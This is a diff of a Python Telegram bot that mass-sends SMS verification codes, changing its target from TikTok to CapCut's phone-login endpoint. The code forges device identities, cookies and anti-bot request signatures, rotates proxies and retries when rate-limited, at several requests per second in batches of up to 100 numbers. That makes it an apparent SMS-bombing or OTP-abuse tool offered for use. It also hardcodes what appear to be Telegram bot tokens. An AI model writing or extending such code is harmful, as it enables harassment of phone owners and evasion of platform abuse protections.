@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-TikTok OTP Telegram Bot - Ultra Fast Edition v6.1
+CapCut OTP Telegram Bot - Ultra Fast Edition v6.1
 ==================================================
 Features:
 1. 5-10 Concurrent OTP Requests Per Second
@@ -13,6 +13,7 @@ Features:
 """
 
 import asyncio
+import hashlib
 import json
 import logging
 import os
@@ -28,6 +29,7 @@ from typing import Optional, List, Dict, Set, Tuple
 from dataclasses import dataclass, field
 from datetime import datetime, timedelta
 from collections import defaultdict
+import base64
 import pytz
 
 import requests
@@ -54,7 +56,7 @@ except ImportError:
 # CONFIGURATION
 # ============================================
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8769178907:AAFAfVthyGDRkc8K8lVMO5u3IWdXSzxOV_o")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8505579150:AAGBjVce28JRWHW8-50F9WQYBJKIJkxzfPg")
 
 # Pakistan Timezone
 PAKISTAN_TZ = pytz.timezone('Asia/Karachi')
@@ -67,12 +69,12 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Performance settings - ULTRA FAST
-MAX_CONCURRENT_OTP = 3          # 5 concurrent OTP requests at once
-MAX_CONCURRENT_TASKS = 150       # Support 100+ concurrent tasks
-BATCH_SIZE = 3                  # Process 5 numbers at a time
-LOG_INTERVAL = 10                # Log every 5 requests
+MAX_CONCURRENT_OTP = 5          # 5 concurrent OTP requests at once
+MAX_CONCURRENT_TASKS = 100       # Support 100+ concurrent tasks
+BATCH_SIZE = 100                  # Process 5 numbers at a time
+LOG_INTERVAL = 5                # Log every 5 requests
 MAX_MESSAGE_LENGTH = 4000
-REQUEST_TIMEOUT = 30             # 15 second timeout per request
+REQUEST_TIMEOUT = 15             # 15 second timeout per request
 
 # Thread pool for blocking operations
 thread_pool = ThreadPoolExecutor(max_workers=50)
@@ -213,29 +215,24 @@ class DeviceIdentityGenerator:
 
 
 # ============================================
-# ALL CONFIRMED WORKING TIKTOK BYPASS ROUTES
+# CAPCUT OTP SENDER (ORIGINAL WORKING LOGIC)
 # ============================================
 
-WORKING_ROUTES = [
-    {"aid": 1340, "app_name": "tiktok_lite", "label": "TikTok Lite", "vc": "330204", "vn": "33.2.4", "mvc": "2023302040", "uvc": "2023302040", "ch": "googleplay", "ua_pkg": "com.zhiliaoapp.musically",
-     "domains": ["api22-normal-c-useast2a.tiktokv.com"]},
+class CapCutOTPSender:
+    """CapCut OTP Sender with SignerPy signatures - Original Working Logic"""
     
-    {"aid": 1340, "app_name": "tiktok_lite", "label": "TikTok Lite", "vc": "330204", "vn": "33.2.4", "mvc": "2023302040", "uvc": "2023302040", "ch": "googleplay", "ua_pkg": "com.zhiliaoapp.musically",
-     "domains": ["api22-normal-c-useast2a.tiktokv.com"]},
+    BASE_URL = "api19-normal-c-useast2a.tiktokv.com"
+    ENDPOINT = "/passport/mobile/send_code/v1/"
     
-    {"aid": 1340, "app_name": "tiktok_lite", "label": "TikTok Lite", "vc": "330204", "vn": "33.2.4", "mvc": "2023302040", "uvc": "2023302040", "ch": "googleplay", "ua_pkg": "com.zhiliaoapp.musically",
-     "domains": ["api22-normal-c-useast2a.tiktokv.com"]},
-]
-
-BYPASS_ENDPOINT = "/passport/mobile/send_code/v1/"
-
-
-# ============================================
-# TIKTOK OTP SENDER (MULTI-ROUTE BYPASS)
-# ============================================
-
-class TikTokOTPSender:
-    """TikTok OTP Sender with SignerPy signatures - Multi-Route Bypass"""
+    BASE_CONFIG = {
+        "app_name": "vicut", "aid": 3006, "version_code": "9200400", "version_name": "9.3.0",
+        "manifest_version_code": "9300200", "update_version_code": "9200400",
+        "app_sdk_version": "83.0.0", "passport_sdk_version": "30876",
+        "effect_sdk_version": "14.9.0", "os": "android", "device_platform": "android",
+        "channel": "googleplay", "carrier_region": "US", "mcc_mnc": "310160",
+        "region": "US", "language": "en", "ac": "wifi", "ssmix": "a",
+        "subdivision_id": "US-CA", "user_type": "0",
+    }
     
     def __init__(self, identity_generator: DeviceIdentityGenerator):
         self.identity_generator = identity_generator
@@ -253,6 +250,43 @@ class TikTokOTPSender:
         self.current_identity = self.identity_generator.generate_fresh_identity()
         return self.current_identity
     
+    def _get_config(self) -> Dict:
+        if not self.current_identity:
+            self.refresh_identity()
+        config = self.BASE_CONFIG.copy()
+        config.update({
+            "device_id": self.current_identity["device_id"],
+            "iid": self.current_identity["iid"],
+            "openudid": self.current_identity["openudid"],
+            "cdid": self.current_identity["cdid"],
+            "did": self.current_identity["did"],
+            "device_type": self.current_identity["device_type"],
+            "device_brand": self.current_identity["device_brand"],
+            "model": self.current_identity["model"],
+            "manu": self.current_identity["manu"],
+            "gpu_render": self.current_identity["gpu_render"],
+            "os_api": self.current_identity["os_api"],
+            "os_version": self.current_identity["os_version"],
+            "resolution": self.current_identity["resolution"],
+            "dpi": self.current_identity["dpi"],
+            "total_memory": self.current_identity["total_memory"],
+            "available_memory": self.current_identity["available_memory"],
+            "cronet_version": self.current_identity["cronet_version"],
+            "ttnet_version": self.current_identity["ttnet_version"],
+        })
+        return config
+    
+    def _get_cookies(self) -> Dict:
+        if not self.current_identity:
+            self.refresh_identity()
+        return {
+            "odin_tt": self.current_identity["odin_tt"],
+            "msToken": self.current_identity["ms_token"],
+            "passport_csrf_token": self.current_identity["csrf_token"],
+            "passport_csrf_token_default": self.current_identity["csrf_token"],
+            "store-idc": "alisg",
+        }
+    
     def _encrypt_phone(self, phone_number: str) -> str:
         if SIGNERPY_AVAILABLE:
             return xor(phone_number)
@@ -262,59 +296,102 @@ class TikTokOTPSender:
             encrypted += format(encrypted_byte, '02x')
         return encrypted
     
-    def _prepare_request_data(self, phone: str, route: dict) -> tuple:
-        """Prepare all request data for a single route"""
-        try:
-            domain = random.choice(route["domains"])
-            identity = self.current_identity
-            ts = int(time.time())
-            
-            url_params_dict = {
-                "passport-sdk-version": "5040090", "device_id": identity["device_id"],
-                "ac": "mobile", "channel": route["ch"], "aid": str(route["aid"]), "app_name": route["app_name"],
-                "version_code": route["vc"], "version_name": route["vn"], "device_platform": "android",
-                "ssmix": "a", "device_type": identity["device_type"],
-                "device_brand": identity["device_brand"], "language": "en",
-                "os_api": identity["os_api"], "os_version": identity["os_version"],
-                "manifest_version_code": route["mvc"], "resolution": identity["resolution"],
-                "dpi": identity["dpi"], "update_version_code": route["uvc"],
-                "_rticket": str(ts * 1000 + random.randint(0, 999)), "cdid": identity["cdid"],
-                "sys_region": "US", "sys_language": "en", "locale": "en",
-                "carrier_region": "af", "mcc_mnc": "41220", "region": "AF"
-            }
-            
-            body_dict = {
-                "auto_read": "1", "account_sdk_source": "app", "unbind_exist": "35",
-                "mix_mode": "1", "mobile": self._encrypt_phone(phone), "multi_login": "1", "type": "3132"
-            }
-            
-            url_params = urlencode(url_params_dict)
-            body = urlencode(body_dict)
-            
-            signatures = sign(params=url_params, payload=body, cookie="", version=8404, aid=route["aid"])
-            
-            headers = {
-                "Host": domain, "Connection": "keep-alive",
-                "X-SS-REQ-TICKET": str(ts * 1000 + random.randint(100, 900)),
-                "x-vc-bdturing-sdk-version": "2.2.1.i18n", "sdk-version": "2",
-                "passport-sdk-version": "5040090", "oec-vc-sdk-version": "3.0.2.i18n",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "X-SS-STUB": signatures.get("x-ss-stub", ""),
-                "x-tt-trace-id": trace_id(device_id=identity["device_id"]) if SIGNERPY_AVAILABLE else "",
-                "X-Argus": signatures.get("x-argus", ""),
-                "X-Gorgon": signatures.get("x-gorgon", ""),
-                "X-Khronos": signatures.get("x-khronos", ""),
-                "X-Ladon": signatures.get("x-ladon", ""),
-                "User-Agent": f"{route['ua_pkg']}/{route['vc']} (Linux; U; Android {identity['os_version']}; en_US; {identity['device_type']}; Build/AP3A.240905.015.A2; Cronet/TTNetVersion:73a761fd 2024-06-12 QuicVersion:46688bb4 2022-11-28)"
-            }
-            
-            url = f"https://{domain}{BYPASS_ENDPOINT}?{url_params}"
-            return url, headers, body, route, None
-        except Exception as e:
-            return None, None, None, None, str(e)
+    def _encode_base64(self, text: str) -> str:
+        return base64.b64encode(text.encode()).decode()
+    
+    def _build_url_params(self, config: Dict, timestamp: int) -> str:
+        rticket = str(timestamp * 1000 + random.randint(0, 999))
+        params = {
+            "passport-sdk-version": config["passport_sdk_version"],
+            "iid": config["iid"], "device_id": config["device_id"],
+            "ac": config["ac"], "channel": config["channel"],
+            "aid": str(config["aid"]), "app_name": config["app_name"],
+            "version_code": config["version_code"], "version_name": config["version_name"],
+            "device_platform": config["device_platform"], "os": config["os"],
+            "ssmix": config["ssmix"], "device_type": config["device_type"],
+            "device_brand": config["device_brand"], "language": config["language"],
+            "os_api": config["os_api"], "os_version": config["os_version"],
+            "openudid": config["openudid"], "manifest_version_code": config["manifest_version_code"],
+            "resolution": config["resolution"], "dpi": config["dpi"],
+            "update_version_code": config["update_version_code"], "_rticket": rticket,
+            "carrier_region": config["carrier_region"], "mcc_mnc": config["mcc_mnc"],
+            "region": config["region"], "cdid": config["cdid"],
+            "effect_sdk_version": config["effect_sdk_version"],
+            "subdivision_id": config["subdivision_id"], "user_type": config["user_type"],
+            "cronet_version": config["cronet_version"], "ttnet_version": config["ttnet_version"],
+            "use_store_region_cookie": "1",
+        }
+        return urlencode(params)
+    
+    def _build_body(self, phone_number: str, config: Dict, timestamp: int) -> str:
+        encrypted_mobile = self._encrypt_phone(phone_number)
+        rticket = str(timestamp * 1000 + random.randint(0, 999))
+        params = {
+            "auto_read": "1", "account_sdk_source": "app", "unbind_exist": "35",
+            "mix_mode": "1", "mobile": encrypted_mobile, "is6Digits": "1", "type": "3631",
+            "iid": config["iid"], "device_id": config["device_id"],
+            "ac": config["ac"], "channel": config["channel"],
+            "aid": str(config["aid"]), "app_name": config["app_name"],
+            "version_code": config["version_code"], "version_name": config["version_name"],
+            "device_platform": config["device_platform"], "os": config["os"],
+            "ssmix": config["ssmix"], "device_type": config["device_type"],
+            "device_brand": config["device_brand"], "language": config["language"],
+            "os_api": config["os_api"], "os_version": config["os_version"],
+            "openudid": config["openudid"], "manifest_version_code": config["manifest_version_code"],
+            "resolution": config["resolution"], "dpi": config["dpi"],
+            "update_version_code": config["update_version_code"], "_rticket": rticket,
+            "carrier_region": config["carrier_region"], "mcc_mnc": config["mcc_mnc"],
+            "region": config["region"], "cdid": config["cdid"],
+        }
+        return urlencode(params)
+    
+    def _build_cookie_string(self, cookies: Dict) -> str:
+        return "; ".join([f"{k}={v}" for k, v in cookies.items()])
+    
+    def _generate_signatures(self, url_params: str, body: str, cookie: str, config: Dict) -> Dict:
+        if not SIGNERPY_AVAILABLE:
+            raise Exception("SignerPy library not available!")
+        return sign(params=url_params, payload=body, cookie=cookie, version=8404, aid=config["aid"])
+    
+    def _build_headers(self, config: Dict, cookies: Dict, timestamp: int, signatures: Dict) -> Dict:
+        return {
+            "Host": "passport16-normal-sg.capcutapi.com",
+            "Connection": "keep-alive",
+            "Cookie": self._build_cookie_string(cookies),
+            "lan": "en", "loc": "US", "pf": "0", "vr": "277884928", "appvr": "9.2.0",
+            "vc": config["version_code"], "device-time": str(timestamp),
+            "tdid": config["device_id"], "sign-ver": "1",
+            "sign": hashlib.md5(f"{timestamp}{config['device_id']}".encode()).hexdigest(),
+            "app-sdk-version": config["app_sdk_version"], "appid": str(config["aid"]),
+            "header-content": f"ode/v1/|0|9.2.0|{timestamp}|{config['device_id']}",
+            "host-abi": "64", "cc-newuser-channel": "common", "Cache-Control": "no-cache",
+            "sysvr": config["os_api"], "ch": config["channel"], "uid": "0",
+            "COMPRESSED": "1", "did": config["did"],
+            "model": self._encode_base64(config["model"]),
+            "manu": self._encode_base64(config["manu"]),
+            "GPURender": self._encode_base64(config["gpu_render"]),
+            "HDR-TDID": config["device_id"], "HDR-TIID": config["iid"],
+            "HDR-Device-Time": str(timestamp), "version_code": "277884928",
+            "total-memory": config["total_memory"], "available-memory": config["available_memory"],
+            "HDR-Sign": hashlib.md5(f"{timestamp}{config['iid']}".encode()).hexdigest(),
+            "HDR-Sign-Ver": "1", "x-tt-passport-csrf-token": cookies["passport_csrf_token"],
+            "x-vc-bdturing-sdk-version": "2.3.0.i18n", "sdk-version": "2",
+            "passport-sdk-version": config["passport_sdk_version"],
+            "commerce-sign-version": "v1", "region": config["region"],
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-SS-STUB": signatures.get("x-ss-stub", ""),
+            "X-SS-DP": str(config["aid"]),
+            "x-tt-trace-id": trace_id(device_id=config["device_id"]) if SIGNERPY_AVAILABLE else "",
+            "User-Agent": f"com.lemon.lvoverseas/{config['manifest_version_code']} (Linux; U; Android {config['os_version']}; en_US; {config['device_type']}; Build/{self.current_identity.get('build_id', 'AP3A.240905.015.A2')}; Cronet/TTNetVersion:{config['cronet_version'].split('_')[0]} {config['cronet_version'].split('_')[1]} QuicVersion:46688bb4 2022-11-28)",
+            "Accept-Encoding": "gzip, deflate",
+            "X-Gorgon": signatures.get("x-gorgon", ""),
+            "X-Khronos": signatures.get("x-khronos", ""),
+            "X-Argus": signatures.get("x-argus", ""),
+            "X-Ladon": signatures.get("x-ladon", ""),
+        }
     
     def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None) -> Dict:
-        """Synchronous OTP send - tries all TikTok routes until success"""
+        """Synchronous OTP send - Original Working Logic"""
         phone = phone_number.strip().replace(" ", "").replace("-", "")
         if not phone.startswith("+"):
             phone = "+" + phone
@@ -324,51 +401,40 @@ class TikTokOTPSender:
         # Refresh identity for each request
         self.refresh_identity()
         
-        session = self._create_session(proxy)
+        config = self._get_config()
+        cookies = self._get_cookies()
+        timestamp = int(time.time())
         
-        routes = list(WORKING_ROUTES)
-        random.shuffle(routes)
-        
-        last_error = "All routes exhausted"
+        url_params = self._build_url_params(config, timestamp)
+        body = self._build_body(phone, config, timestamp)
+        cookie_str = self._build_cookie_string(cookies)
         
         try:
-            for route in routes:
-                url, headers, body, route_info, error = self._prepare_request_data(phone, route)
-                if error:
-                    last_error = f"Signing failed: {error}"
-                    continue
-                
-                try:
-                    response = session.post(url, data=body, headers=headers, timeout=REQUEST_TIMEOUT)
-                    elapsed = (time.time() - start_time) * 1000
-                    data = response.text
-                    
-                    if '"message":"success"' in data:
-                        try:
-                            result = response.json()
-                        except json.JSONDecodeError:
-                            result = {}
-                        result["success"] = True
-                        result["proxy_used"] = proxy or "Direct"
-                        result["device_id"] = self.current_identity["device_id"]
-                        result["time_ms"] = elapsed
-                        result["phone"] = phone
-                        result["route"] = route_info["label"]
-                        return result
-                    elif "maximum" in data.lower():
-                        last_error = f"Rate limited via {route_info['label']}"
-                        continue
-                    else:
-                        last_error = data[:100]
-                        continue
-                        
-                except requests.exceptions.RequestException as e:
-                    last_error = str(e)[:100]
-                    continue
-            
-            elapsed = (time.time() - start_time) * 1000
-            return {"error": last_error, "success": False, "time_ms": elapsed, "phone": phone}
+            signatures = self._generate_signatures(url_params, body, cookie_str, config)
+        except Exception as e:
+            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
         
+        headers = self._build_headers(config, cookies, timestamp, signatures)
+        url = f"{self.BASE_URL}{self.ENDPOINT}?{url_params}"
+        
+        session = self._create_session(proxy)
+        
+        try:
+            response = session.post(url, data=body, headers=headers, timeout=15)
+            elapsed = (time.time() - start_time) * 1000
+            try:
+                result = response.json()
+                result["success"] = result.get("message") == "success"
+                result["proxy_used"] = proxy or "Direct"
+                result["device_id"] = config["device_id"]
+                result["time_ms"] = elapsed
+                result["phone"] = phone
+                return result
+            except json.JSONDecodeError:
+                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
+        except requests.exceptions.RequestException as e:
+            elapsed = (time.time() - start_time) * 1000
+            return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
         finally:
             session.close()
 
@@ -547,7 +613,7 @@ async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Sema
         proxy = random.choice(proxies) if proxies else None
         
         # Create a new sender instance for thread safety
-        sender = TikTokOTPSender(identity_generator)
+        sender = CapCutOTPSender(identity_generator)
         
         # Run blocking OTP send in thread pool
         result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
@@ -559,7 +625,7 @@ async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Sema
             
             if any(kw in error_desc for kw in limit_keywords):
                 proxy = random.choice(proxies) if proxies else None
-                sender2 = TikTokOTPSender(identity_generator)
+                sender2 = CapCutOTPSender(identity_generator)
                 result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, proxy)
         
         await global_stats.increment(result.get("success", False))
@@ -583,7 +649,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     msg = f"""
-🚀 <b>TikTok OTP Bot - Ultra Fast v6.1</b>
+🚀 <b>CapCut OTP Bot - Ultra Fast v6.1</b>
 
 ⚡ <b>Performance:</b>
 • 5-10 Concurrent OTP/Second
@@ -1056,7 +1122,7 @@ async def process_single_otp(update: Update, context: ContextTypes.DEFAULT_TYPE,
     
     # Use thread pool for blocking operation
     loop = asyncio.get_event_loop()
-    sender = TikTokOTPSender(identity_generator)
+    sender = CapCutOTPSender(identity_generator)
     result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
     
     await global_stats.increment(result.get("success", False))
@@ -1394,7 +1460,7 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    logger.info("🚀 TikTok OTP Ultra Fast Bot v6.1 starting...")
+    logger.info("🚀 Ultra Fast Bot v6.1 starting...")
     logger.info(f"⚡ Max Concurrent OTP: {MAX_CONCURRENT_OTP}")
     logger.info(f"📊 Log Interval: Every {LOG_INTERVAL} requests")
     logger.info(f"⏰ Schedule Feature: Enabled")
